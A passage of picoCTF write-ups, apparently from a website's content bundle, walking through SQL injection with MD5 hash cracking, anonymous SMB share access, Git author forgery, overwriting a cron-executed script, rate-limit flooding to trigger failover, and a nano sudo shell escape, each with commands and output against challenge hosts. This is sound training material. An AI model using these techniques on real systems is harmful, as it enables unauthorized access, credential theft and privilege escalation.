  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%201--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%202--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%203--%20-' | sed -n '1,220p'
\`\`\`

### Why these commands

\`ORDER BY n\` helps determine how many columns are in the original query:

- If \`n\` is valid, the query works
- If \`n\` is too large, the database throws an error

### Result

\`ORDER BY 3\` caused:

\`\`\`text
1st ORDER BY term out of range - should be between 1 and 2
\`\`\`

So the query had exactly **2 columns**.

## Confirm UNION Reflection

Next I checked whether UNION results were reflected into the HTML.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20UNION%20SELECT%201,2--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20UNION%20SELECT%20%27AAA%27,%27BBB%27--%20-' | sed -n '1,220p'
\`\`\`

### Result

The application rendered:

\`\`\`html
<li><strong>AAA</strong>: BBB</li>
\`\`\`

That meant both UNION-selected columns were printed. This made manual extraction easy.

## Dump Database Schema

With reflection working, I queried \`sqlite_master\` to list tables and create statements.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20name,sql%20FROM%20sqlite_master%20WHERE%20type='table'--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Why this command

In SQLite, \`sqlite_master\` stores schema metadata.

### Result

The database contained:

- \`users\`
- \`flags\`
- \`sqlite_sequence\`

The useful schemas were:

\`\`\`sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
)
\`\`\`

\`\`\`sql
CREATE TABLE flags (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT NOT NULL UNIQUE,
    value TEXT NOT NULL
)
\`\`\`

## Dump the flags Table

Now I extracted the contents of \`flags\`.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20key,value%20FROM%20flags--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Result

This returned multiple flag-like values:

\`\`\`text
ctf-player : picoCTF{<redacted>}
flag1      : picoCTF{<redacted>}
flag2      : picoCTF{<redacted>}
flag3      : picoCTF{<redacted>}
flag4      : picoCTF{<redacted>}
...
\`\`\`

These looked like decoys rather than the final answer.

## Dump the users Table

The challenge hint also said passwords were stored in MD5 format, so I dumped the \`users\` table.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20username,password%20FROM%20users--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Result

This returned users and MD5 hashes:

\`\`\`text
admin      : 5a9a79d9fa477ed163b89088681672c9
ctf-player : 7a67ab5872843b22b5e14511867c4e43
ghost      : 8d2379c40704bed972e55680be2355e2
malicious  : a669d60c31ad3d05b9e453c8576c7aab
noaccess   : 83806b490e28a7f8e6662646cbdbff1a
pico       : d3401cacf87221ecb1fe4f93b8bb90cd
suspicious : eb1f3ba6901c65d9b2e09a38f560758b
\`\`\`

At this point, the challenge hint made sense: SQL injection exposed MD5 password hashes, and one of those needed to be cracked.

## Crack the MD5 Passwords

I used \`rockyou.txt.gz\` and Python to test MD5 hashes without unpacking the wordlist.

\`\`\`bash
python3 - <<'PY'
import gzip, hashlib
hashes={
    'admin':'5a9a79d9fa477ed163b89088681672c9',
    'ctf-player':'7a67ab5872843b22b5e14511867c4e43',
    'ghost':'8d2379c40704bed972e55680be2355e2',
    'malicious':'a669d60c31ad3d05b9e453c8576c7aab',
    'noaccess':'83806b490e28a7f8e6662646cbdbff1a',
    'pico':'d3401cacf87221ecb1fe4f93b8bb90cd',
    'suspicious':'eb1f3ba6901c65d9b2e09a38f560758b',
}
rev={v:k for k,v in hashes.items()}
found={}
with gzip.open('/usr/share/wordlists/rockyou.txt.gz','rt',encoding='latin-1',errors='ignore') as f:
    for line in f:
        pwd=line.rstrip('\\n')
        h=hashlib.md5(pwd.encode()).hexdigest()
        if h in rev and rev[h] not in found:
            found[rev[h]]=pwd
            print(rev[h], pwd)
            if len(found)==len(hashes):
                break
print('found', found)
PY
\`\`\`

### Why this command

- \`gzip.open(...)\` streams the compressed wordlist directly
- \`hashlib.md5(...)\` computes candidate hashes
- This avoids creating a huge decompressed file

### Result

It recovered:

\`\`\`text
ctf-player dyesebel
pico pico
\`\`\`

The important new credential was:

\`\`\`text
ctf-player : dyesebel
\`\`\`

## Final Step: Login as the Legitimate User

The challenge statement said to retrieve the secret flag by acting as a legit user. That implied the SQLi output alone was not the final answer, and \`ctf-player\` was likely the intended account.

So I logged in as that user:

\`\`\`bash
curl -s -c /tmp/sqlmap1b.cookies -b /tmp/sqlmap1b.cookies \\
  -d 'username=ctf-player&password=dyesebel' \\
  http://lonely-island.picoctf.net:65472/login.php -L | sed -n '1,260p'
\`\`\`

### Result

The protected page displayed:

\`\`\`text
The challenge flag is:
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Full Tooling Used

### \`curl\`

Used for:

- fetching pages
- submitting login forms
- replaying authenticated requests
- manually testing SQL injection payloads

Why it mattered:

- fast direct HTTP inspection
- easy cookie reuse
- precise GET/POST control

### \`sqlmap\`

Used for:

- confirming the parameter was injectable
- identifying the backend DBMS as SQLite

Why it mattered:

- quickly validated the challenge hint
- saved time on injection detection

Why I did not rely on it for everything:

- SQLite enumeration was unreliable on this small target
- manual UNION extraction was faster once the injection shape was known

### \`sed\`

Used to trim HTTP output:

\`\`\`bash
sed -n '1,220p'
\`\`\`

Why it mattered:

- kept responses readable
- avoided scrolling through unnecessary markup

### \`python3\`

Used to crack MD5 hashes with \`rockyou.txt.gz\`.

Why it mattered:

- easy hash testing
- direct streaming of the compressed wordlist
- enough flexibility to match multiple hashes at once

## Why the Attack Worked

The app had two independent weaknesses:

1. The authenticated search parameter \`q\` was SQL injectable.
2. User passwords were stored in raw MD5, which is weak and crackable.

SQL injection exposed the \`users\` and \`flags\` tables, but the real final flag required logging in as the legitimate user \`ctf-player\`. Cracking the MD5 hash for that account produced the password \`dyesebel\`, and that login revealed the actual flag on the protected page.

## Takeaway

This challenge was not just “dump the database and stop.” The intended path was:

1. Login as \`pico:pico\`
2. Find SQL injection in \`vuln.php?q=...\`
3. Dump \`users\` and \`flags\`
4. Crack the leaked MD5 hash for \`ctf-player\`
5. Login legitimately as \`ctf-player\`
6. Read the real flag

Final working credential:

\`\`\`text
ctf-player : dyesebel
\`\`\`

Final flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`printer-shares`,title:`Printer Shares`,excerpt:`picoCTF Printer Shares writeup enumerating SMB shares to discover and access hidden printer share files containing the flag.`,category:`picoCTF - General Skills`,content:`# Printer Shares

## Challenge

**Category:** General Skills  
**Name:** Printer Shares

**Prompt:**

> Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?
> The printer is on \`52805\`.
> you can try \`$ nc -vz mysterious-sea.picoctf.net 52805\`

## Goal

Find the exposed file on the remote print server and recover the flag.

## Initial idea

The wording mentions a **network printer** and **printer shares**. That suggests the service may expose a printer-related network share rather than a normal shell or web service.

The provided hint command checks whether the port is open:

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
\`\`\`

What this does:

- \`nc\` is netcat
- \`-v\` enables verbose output
- \`-z\` does a scan without sending application data

## Step 1: Verify the port is open

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
\`\`\`

Observed result:

\`\`\`text
mysterious-sea.picoctf.net [3.130.79.223] 52805 open
\`\`\`

This confirms something is listening on port \`52805\`.

## Step 2: Think about the protocol

A raw \`nc\` connection did not immediately print a banner, so this was probably not a simple text service.

Because the challenge title is **Printer Shares**, the next reasonable guess is **SMB/Samba** with an exposed share. SMB shares are commonly used to expose files and printers on a network.

Good tools for that:

- \`smbclient\` to list and access shares
- \`smbmap\` to enumerate permissions

## Step 3: Enumerate available SMB shares

\`\`\`bash
smbclient -N -L //mysterious-sea.picoctf.net/ -p 52805
\`\`\`

What this command means:

- \`smbclient\` is an SMB client, similar to an FTP client for Windows/Samba shares
- \`-N\` means anonymous login with no password
- \`-L\` lists available shares
- \`//mysterious-sea.picoctf.net/\` is the target host
- \`-p 52805\` tells \`smbclient\` to use the custom challenge port

Result:

\`\`\`text
Sharename       Type      Comment
---------       ----      -------
shares          Disk      Public Share With Guests
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
\`\`\`

This is the key discovery:

- there is a share called \`shares\`
- it allows **guest** access
- that means we can likely browse files without credentials

## Step 4: List files inside the exposed share

\`\`\`bash
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'ls'
\`\`\`

What this does:

- connects directly to the \`shares\` share
- uses anonymous access
- runs the SMB command \`ls\`

Result:

\`\`\`text
  .                                   D        0
  ..                                  D        0
  dummy.txt                           N     1142
  flag.txt                            N       37
\`\`\`

Now the challenge is effectively solved:

- \`flag.txt\` is visible in the share
- so the printer or print server exposed the sensitive file directly over SMB

## Step 5: Download the flag

\`\`\`bash
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'get flag.txt'
\`\`\`

Explanation:

- \`get flag.txt\` downloads the remote file into the current local directory

Then read it:

\`\`\`bash
cat flag.txt
\`\`\`

Output:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge relies on recognizing that the “printer” is actually exposing files through an SMB/Samba share.

The vulnerability is not code execution or memory corruption. It is simple **misconfiguration**:

- a guest-accessible network share existed
- the sensitive print output was stored there
- anonymous users could browse and download it

## Minimal solve path

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
smbclient -N -L //mysterious-sea.picoctf.net/ -p 52805
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'ls'
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'get flag.txt'
cat flag.txt
\`\`\`

## Takeaway

Not every CTF network service is meant to be attacked with exploitation payloads. Sometimes the whole challenge is identifying the protocol correctly and using the right client tool. Here, the important skill was recognizing an exposed SMB share on a non-standard port and pulling the leaked file from it.
`},{id:`my-git`,title:`MY GIT`,excerpt:`picoCTF My Git writeup forging a Git commit identity to bypass repository validation checks and retrieve the flag.`,category:`picoCTF - General Skills`,content:`# MY GIT

## Challenge

**Category:** General Skills  
**Name:** MY GIT

**Prompt:**

> I have built my own Git server with my own rules!
> You can clone the challenge repo using the command below.
>
> \`git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git\`
>
> Here's the password: \`3a51a2e1\`
> Check the README to get your flag!

## Goal

Clone the custom Git repository, understand the server's special rule, and recover the flag.

## Initial observation

The challenge title and prompt strongly suggest this is not about normal Git usage. The important phrase is:

> I have built my own Git server with my own rules!

That usually means:

- the server has custom hooks
- something interesting happens on \`push\`
- the README contains the actual hint

## Step 1: Clone the repository

\`\`\`bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
\`\`\`

Because the repo is served over SSH on a custom port, Git prompts for:

- host authenticity confirmation the first time
- the password provided in the challenge

Password used:

\`\`\`text
3a51a2e1
\`\`\`

## Step 2: Read the README

\`\`\`bash
cat README.md
\`\`\`

Contents:

\`\`\`md
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by \`\`\`root:root@picoctf\`\`\` will be updated with the flag.

GOOD LUCK!
\`\`\`

## Key insight

The server is not checking who authenticated over SSH in a secure way. Instead, it appears to trust Git metadata inside a pushed commit.

That is a mistake because Git commit metadata is user-controlled.

In Git, the following fields can be set to anything:

- author name
- author email
- committer name
- committer email

So if the custom server only checks whether the pushed commit claims to be from:

\`\`\`text
root <root@picoctf>
\`\`\`

then we can impersonate that identity trivially.

## Step 3: Create a \`flag.txt\` file

The README says the server only updates \`flag.txt\`, so we need to include that file in our commit.

\`\`\`bash
printf 'please update me\\n' > flag.txt
git add flag.txt
\`\`\`

Explanation:

- \`printf\` creates a placeholder file
- \`git add flag.txt\` stages it for commit

The contents do not matter much. The server only cares that:

- \`flag.txt\` exists in the pushed commit
- the commit appears to come from \`root@picoctf\`

## Step 4: Forge the Git identity

Make the commit with both author and committer set to the expected identity:

\`\`\`bash
GIT_AUTHOR_NAME='root' \\
GIT_AUTHOR_EMAIL='root@picoctf' \\
GIT_COMMITTER_NAME='root' \\
GIT_COMMITTER_EMAIL='root@picoctf' \\
git commit -m 'Add flag.txt for server update'
\`\`\`

What these environment variables do:

- \`GIT_AUTHOR_NAME\` sets the commit author name
- \`GIT_AUTHOR_EMAIL\` sets the commit author email
- \`GIT_COMMITTER_NAME\` sets the committer name
- \`GIT_COMMITTER_EMAIL\` sets the committer email

This works because Git does not cryptographically verify those identity fields by default.

## Step 5: Verify the forged metadata locally

\`\`\`bash
git show --quiet --format=fuller HEAD
\`\`\`

Expected output shape:

\`\`\`text
Author:     root <root@picoctf>
Commit:     root <root@picoctf>
\`\`\`

This confirms the pushed commit will claim to be from the target identity.

## Step 6: Push to the remote server

\`\`\`bash
git push origin master
\`\`\`

Use the same SSH password again when prompted:

\`\`\`text
3a51a2e1
\`\`\`

## Server response

The remote hook responded with:

\`\`\`text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The vulnerability is **trusting unauthenticated Git metadata**.

The server should have verified identity using something stronger, such as:

- authenticated SSH account mapping
- signed commits
- server-side authorization rules not based on author strings

Instead, it trusted fields that the attacker fully controls.

That allowed us to impersonate:

\`\`\`text
root <root@picoctf>
\`\`\`

without actually logging in as root.

## Minimal solve path

\`\`\`bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
cd challenge
cat README.md
printf 'please update me\\n' > flag.txt
git add flag.txt
GIT_AUTHOR_NAME='root' GIT_AUTHOR_EMAIL='root@picoctf' GIT_COMMITTER_NAME='root' GIT_COMMITTER_EMAIL='root@picoctf' git commit -m 'Add flag.txt for server update'
git push origin master
\`\`\`

## Takeaway

Git commit identity is not proof of authorship. If a server makes authorization decisions based only on author or committer name/email fields, it is vulnerable to impersonation.
`},{id:`bytemancy-3`,title:`bytemancy 3`,excerpt:`picoCTF Bytemancy 3 writeup using objdump disassembly and pwntools p32 packing to reconstruct data from binary sections and extract the flag.`,category:`picoCTF - General Skills`,content:`# bytemancy 3

## Challenge

**Category:** General Skills  
**Name:** bytemancy 3

**Prompt summary:**

- source code provided as \`app.py\`
- binary provided as \`spellbook\`
- connect with:

\`\`\`bash
nc green-hill.picoctf.net 56727
\`\`\`

- hint says to use \`pwnlib.util.packing.p32()\`
- hint also says \`objdump -t spellbook\` reveals the symbol table

## Goal

Send the correct function addresses as **4 raw bytes in little-endian order** for the procedures the server asks about.

## Step 1: Read the Python source

The challenge wrapper makes the task very explicit:

\`\`\`python
SPELLBOOK_FUNCTIONS = [
    "ember_sigil",
    "glyph_conflux",
    "astral_spark",
    "binding_word",
]
\`\`\`

Each round the server:

1. randomly picks 3 of those 4 names
2. looks up the function address inside the local ELF
3. converts the address with \`p32(target_addr)\`
4. expects us to send exactly those 4 bytes

Critical line:

\`\`\`python
expected_bytes = p32(target_addr)
\`\`\`

That means:

- \`p32()\` packs a 32-bit integer
- on x86 this becomes **little-endian**
- we must send raw bytes, not the address as text like \`0x8049176\`

## Step 2: Extract the symbol addresses from the binary

Use the symbol table:

\`\`\`bash
objdump -t spellbook
\`\`\`

Relevant entries:

\`\`\`text
08049176 g     F .text  00000024 ember_sigil
0804919a g     F .text  00000027 glyph_conflux
080491c1 g     F .text  00000022 astral_spark
080491e3 g     F .text  00000031 binding_word
\`\`\`

So the addresses are:

- \`ember_sigil\` = \`0x08049176\`
- \`glyph_conflux\` = \`0x0804919a\`
- \`astral_spark\` = \`0x080491c1\`
- \`binding_word\` = \`0x080491e3\`

## Step 3: Convert them to raw little-endian bytes

Using \`p32()\`:

\`\`\`python
from pwn import p32

print(p32(0x08049176).hex())  # 76910408
print(p32(0x0804919a).hex())  # 9a910408
print(p32(0x080491c1).hex())  # c1910408
print(p32(0x080491e3).hex())  # e3910408
\`\`\`

So the byte mappings are:

- \`ember_sigil\` -> \`76 91 04 08\`
- \`glyph_conflux\` -> \`9a 91 04 08\`
- \`astral_spark\` -> \`c1 91 04 08\`
- \`binding_word\` -> \`e3 91 04 08\`

These are the exact raw bytes that must be sent.

## Step 4: Automate the interaction

Because the server asks for 3 random names, the easiest solution is to script it.

Exploit script:

\`\`\`python
from pwn import remote, p32

mapping = {
    b'ember_sigil': p32(0x8049176),
    b'glyph_conflux': p32(0x804919a),
    b'astral_spark': p32(0x80491c1),
    b'binding_word': p32(0x80491e3),
}

io = remote('green-hill.picoctf.net', 56727)

for _ in range(3):
    line = io.recvline_contains(b"address for procedure '")
    name = line.split(b"'")[1]
    io.recvuntil(b'==> ')
    io.send(mapping[name])

print(io.recvall(timeout=3).decode('latin1', 'replace'))
\`\`\`

## Step 5: Recover the flag

Running the script returned:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge is testing three simple binary-reversing skills:

1. identify symbols in an ELF with \`objdump -t\`
2. understand little-endian byte order
3. send binary data, not text

If you type \`0x08049176\` into netcat, that is wrong because the program expects:

\`\`\`text
\\x76\\x91\\x04\\x08
\`\`\`

as four raw bytes.

## Minimal solve path

\`\`\`bash
objdump -t spellbook | rg 'ember_sigil|glyph_conflux|astral_spark|binding_word'
python3 solve.py
\`\`\`

Where \`solve.py\` contains the script above.

## Takeaway

When a binary or service asks for an address, always check whether it wants:

- the human-readable address string
- or the packed byte representation

Here it specifically wanted the packed 32-bit little-endian form, which is exactly what \`p32()\` is for.
`},{id:`printer-shares-3`,title:`Printer Shares 3`,excerpt:`picoCTF Printer Shares 3 writeup discovering a writable cron job script on a printer share and exploiting it for remote code execution to capture the flag.`,category:`picoCTF - General Skills`,content:`# Printer Shares 3

## Challenge

**Category:** General Skills  
**Name:** Printer Shares 3

**Prompt:**

> I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory
> two printers are on \`56098\`, one private, one public.
> you can try \`$ nc -vz dolphin-cove.picoctf.net 56098\`

Additional hint:

> a suspicious script is running every minute, this script runs every minute, you might need to wait for a while

## Goal

Access the private printer data indirectly through the public share and recover the flag.

## Initial idea

This challenge is clearly related to the earlier SMB printer share tasks:

- there are two shares: one public and one private
- a script runs every minute
- a debug script was “left in place”

That strongly suggests:

1. the public share is reachable anonymously
2. the public share contains a script
3. that script is being executed by cron
4. if the share is writable, we can replace the script and make cron read the private directory for us

## Step 1: Verify the port is open

\`\`\`bash
nc -vz dolphin-cove.picoctf.net 56098
\`\`\`

Result:

\`\`\`text
dolphin-cove.picoctf.net [3.13.34.175] 56098 open
\`\`\`

## Step 2: Enumerate SMB shares

Because this is a printer/share challenge, try SMB enumeration first:

\`\`\`bash
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
\`\`\`

Explanation:

- \`smbclient\` is an SMB client
- \`-N\` means anonymous login
- \`-L\` lists shares
- \`-p 56098\` uses the custom challenge port

Result:

\`\`\`text
Sharename       Type      Comment
---------       ----      -------
shares          Disk      Public Share With Guests
secure-shares   Disk      Printer for internal usage only
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
\`\`\`

Important finding:

- \`shares\` is public
- \`secure-shares\` is the protected target

## Step 3: Inspect the public share

List files inside \`shares\`:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
\`\`\`

Result:

\`\`\`text
script.sh
cron.log
\`\`\`

This matches the hint exactly:

- \`script.sh\` is likely the debug script
- \`cron.log\` probably stores the output from the minute-based cron job

## Step 4: Download the script and the log

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get script.sh'
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
\`\`\`

Read them:

\`\`\`bash
cat script.sh
cat cron.log
\`\`\`

Contents:

\`\`\`bash
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"
\`\`\`

And the log looked like:

\`\`\`text
Health Check: Wed Mar 11 10:37:01 UTC 2026
Health Check: Wed Mar 11 10:38:01 UTC 2026
\`\`\`

This proves:

- the script is actually being executed
- its output is being written into \`cron.log\`

## Step 5: Check whether the public share is writable

If we can overwrite \`script.sh\`, we can turn cron into a file-reading primitive.

Test write access:

\`\`\`bash
printf 'test-write\\n' > /tmp/printer3_test.txt
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_test.txt test-write.txt; ls'
\`\`\`

Result:

- upload succeeded
- the file appeared in the share

That is the key vulnerability:

- anonymous users can modify a script that a privileged scheduled task runs

## Step 6: First-stage payload to discover the private path

Before directly reading the flag, use a small reconnaissance script:

\`\`\`bash
cat > /tmp/printer3_probe.sh <<'EOF'
#!/bin/bash
id
pwd
find / -maxdepth 4 -name flag.txt 2>/dev/null
EOF
\`\`\`

Upload it over the existing \`script.sh\`:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_probe.sh script.sh'
\`\`\`

Then wait a bit more than one minute and pull the log again:

\`\`\`bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
\`\`\`

New log output:

\`\`\`text
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
/challenge/shares
/challenge/secure-shares/flag.txt
\`\`\`

This tells us:

- the cron job runs as the \`challenge\` user
- it executes from \`/challenge/shares\`
- the private flag file is at \`/challenge/secure-shares/flag.txt\`

## Step 7: Second-stage payload to print the flag

Now replace the script with a direct \`cat\`:

\`\`\`bash
cat > /tmp/printer3_flag.sh <<'EOF'
#!/bin/bash
cat /challenge/secure-shares/flag.txt
EOF
\`\`\`

Upload it:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_flag.sh script.sh'
\`\`\`

Wait for the next cron execution:

\`\`\`bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
tail -n 20 cron.log
\`\`\`

The flag appeared in the public log:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

This is a classic insecure scheduled-task / writable-script issue.

The intended private directory was protected from direct anonymous browsing, but that protection failed because:

1. the public share was writable
2. a cron job executed a script from that writable location
3. the cron output was written back into a public log file

That gave us an indirect path:

- overwrite script
- wait for cron
- read output from log

So the “private” share was effectively readable through the public one.

## Minimal solve path

\`\`\`bash
nc -vz dolphin-cove.picoctf.net 56098
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
printf '#!/bin/bash\\ncat /challenge/secure-shares/flag.txt\\n' > /tmp/script.sh
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/script.sh script.sh'
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
\`\`\`

## Takeaway

Protecting a directory is meaningless if a scheduled task with access to that directory executes attacker-controlled code from a writable location. The real vulnerability here is not the private share itself, but the trust boundary broken by the cron-executed debug script.
`},{id:`failure-failure`,title:`Failure Failure`,excerpt:`picoCTF Failure Failure writeup exploiting HAProxy failover behavior by exhausting rate limits to trigger backend routing to the flag server.`,category:`picoCTF - General Skills`,content:`# Failure Failure

## Challenge

**Category:** General Skills  
**Name:** Failure Failure

**Prompt:**

> Welcome to Failure Failure — a high-available system.
> This challenge simulates a real-world failover scenario where one server is prioritized over the other.
> A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
> You can begin your journey here to try and retrieve the flag.
>
> For reference:
> The HAProxy configuration used in this challenge is available here.
> The application code is available here

## Goal

Force the load balancer off the primary server and onto the backup server, because the backup server is the one that contains the flag.

## Step 1: Read the application code

The provided Flask app:

\`\`\`python
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

def global_rate_limit_key():
    return "global"

limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
\`\`\`

Important details:

1. The rate limit is **global**
2. The key function always returns \`"global"\`
3. So every request counts against the same bucket
4. When the limit is exceeded, the app returns \`503\`
5. The flag is shown only when \`IS_BACKUP=yes\`

That means:

- the primary server likely returns \`"No flag in this service"\`
- the backup server likely returns the real flag

## Step 2: Read the HAProxy configuration

Provided config:

\`\`\`haproxy
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
\`\`\`

Important details:

1. \`s1\` is the normal primary backend
2. \`s2\` is marked \`backup\`
3. HAProxy health-checks \`/\`
4. HAProxy expects HTTP status \`200\`
5. If a backend starts returning non-\`200\`, it can be marked down

This is the full intended path:

- flood the primary
- trigger its global limit
- it starts returning \`503\`
- HAProxy health checks fail
- HAProxy marks \`s1\` down
- traffic fails over to backup \`s2\`
- \`s2\` returns the flag

## Step 3: Confirm normal behavior

Request the page normally:

\`\`\`bash
curl -i -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

Observed response body:

\`\`\`html
<p>No flag in this service</p>
\`\`\`

So the live traffic was initially going to the primary.

## Step 4: Trigger failover by exhausting the primary

The rate limit is \`300 per minute\`, so send more than that quickly.

A fast concurrent burst worked:

\`\`\`bash
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

What this does:

- \`seq 1 360\` generates 360 requests
- \`xargs -P60\` runs many requests in parallel
- \`curl -s -o /dev/null\` sends the traffic without printing page bodies
- \`sleep 5\` gives HAProxy a moment to register health-check failures
- the final \`curl\` fetches the page after failover

## Step 5: Read the flag from the backup server

After the burst, the final request returned:

\`\`\`html
<p>picoCTF{<redacted>}</p>
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

This is an availability-design bug:

- the app uses a global rate limit
- HAProxy health-checks the exact same route
- health checks require status \`200\`
- the limit exhaustion makes the primary look unhealthy

So normal user traffic can influence load balancer health state.

The mistake is that:

- the primary and backup expose different data
- and the balancer’s failover condition is externally triggerable

That lets an attacker force routing to the backup.

## Minimal solve path

\`\`\`bash
curl -s http://mysterious-sea.picoctf.net:53064/
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

## Takeaway

Health-check endpoints should not share fragile state with user traffic, especially not global rate limits. If production routing decisions depend on a route that attackers can intentionally degrade, failover can become an access-control bypass.
`},{id:`absolute-nano`,title:`ABSOLUTE NANO`,excerpt:`picoCTF Absolute Nano writeup using GTFOBins nano technique with sudo privileges to escalate access and read the flag file.`,category:`picoCTF - General Skills`,content:`# ABSOLUTE NANO

## Challenge

**Category:** General Skills  
**Name:** ABSOLUTE NANO

**Prompt summary:**

- SSH access is provided
- hint: "What can you do with nano?"

## Goal

Use the allowed \`nano\` capability to escalate privileges or read the protected flag.

## Initial access

Connect with SSH:

\`\`\`bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
\`\`\`

Password:

\`\`\`text
46cb0c29
\`\`\`

## Step 1: Inspect the environment

Once connected, basic recon showed:

\`\`\`bash
ls -la
id
sudo -l
\`\`\`

Important findings:

\`\`\`text
-r--r----- 1 root root 35 ... flag.txt
\`\`\`

So \`flag.txt\` exists in the home directory but is only readable by \`root\`.

The key \`sudo\` rule was:

\`\`\`text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
\`\`\`

That means:

- we cannot run arbitrary \`sudo\`
- but we *can* run \`nano\` as root on \`/etc/sudoers\`

This is enough, because \`nano\` has multiple GTFOBins-style escape and file-access features.

## Relevant nano techniques

The useful \`nano\` techniques here are:

### 1. Execute a command from inside nano

Inside \`nano\`:

\`\`\`text
^R^X
\`\`\`

Then enter a shell command.

This is the most reliable route for this challenge because \`nano\` is running as \`root\` via \`sudo\`.

### 2. Spawn a shell from inside nano

Also from GTFOBins:

\`\`\`text
^R^X
reset; sh 1>&0 2>&0
\`\`\`

This can produce a root shell when terminal behavior cooperates.

### 3. Use spell checker hooks

If \`SPELL\` or \`-s\` is controllable, \`nano\` can be turned into a shell launcher through spell-check execution.

That technique is valid in general, but it was not necessary here.

